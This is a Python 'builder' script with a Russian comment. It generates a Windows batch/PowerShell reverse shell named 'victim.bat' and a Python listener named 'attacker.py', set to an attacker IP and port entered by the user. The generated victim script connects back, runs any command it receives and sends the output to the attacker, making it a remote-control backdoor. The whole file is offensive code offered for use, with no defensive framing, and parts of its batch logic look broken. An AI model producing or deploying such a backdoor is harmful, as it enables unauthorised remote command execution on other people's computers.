import os

def create_victim_script(server_ip, server_port):
    victim_script = f"""
@echo off
setlocal enabledelayedexpansion

set "server_ip={server_ip}"
set "server_port={server_port}"

:connect
echo Connecting to %server_ip%:%server_port%...
for /f "delims=" %%a in ('powershell -command "New-Object System.Net.Sockets.TCPClient(%server_ip%, %server_port%)"') do set "client=%%a"

if not defined client (
    echo Connection failed. Retrying in 5 seconds...
    timeout /t 5 /nobreak >nul
    goto connect
)

:loop
echo Waiting for command...
powershell -command "Set-Content -Path temp.txt -Value (New-Object System.IO.StreamReader($client.GetStream())).ReadLine()"
if not exist temp.txt (
    echo Failed to read command. Retrying...
    goto loop
)

set /p command=<temp.txt
del temp.txt

if /i "%command%"=="exit" (
    echo Exiting...
    exit /b
)

echo Executing command: %command%
for /f "delims=" %%a in ('%command%') do set "output=%%a"

if not defined output (
    echo No output returned.
) else (
    echo Sending output...
    powershell -command "New-Object System.IO.StreamWriter($client.GetStream(), [System.Text.Encoding]::ASCII).WriteLine('%output%')"
)

goto loop
"""

    with open("victim.bat", "w") as file:
        file.write(victim_script)

def create_attacker_script(server_ip, server_port):
    attacker_script = f"""
import socket

def listen_for_connection(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, port))
        s.listen(1)

        print(f"Listening for incoming connections on {{ip}}:{{port}}...")
        conn, addr = s.accept()
        print(f"Connection established with {{addr}}")

        while True:
            command = input("Enter command: ")
            conn.send(command.encode())
            if command.lower() == 'exit':
                break
            output = conn.recv(1024).decode()
            print(output)

        conn.close()
        s.close()
    except Exception as e:
        print(f"Error: {{e}}")

if __name__ == "__main__":
    server_ip = "{server_ip}"
    server_port = {server_port}

    listen_for_connection(server_ip, server_port)
"""

    with open("attacker.py", "w") as file:
        file.write(attacker_script)

def main():
    # Установите IP-адрес по умолчанию
    default_ip = "192.168.1.100"
    server_ip = input(f"Enter the attacker's IP address (default: {default_ip}): ")
    if server_ip == "":
        server_ip = default_ip

    server_port = input("Enter the attacker's port number: ")

    create_victim_script(server_ip, server_port)
    create_attacker_script(server_ip, server_port)

    print("Builder completed successfully!")

if __name__ == "__main__":
    main()
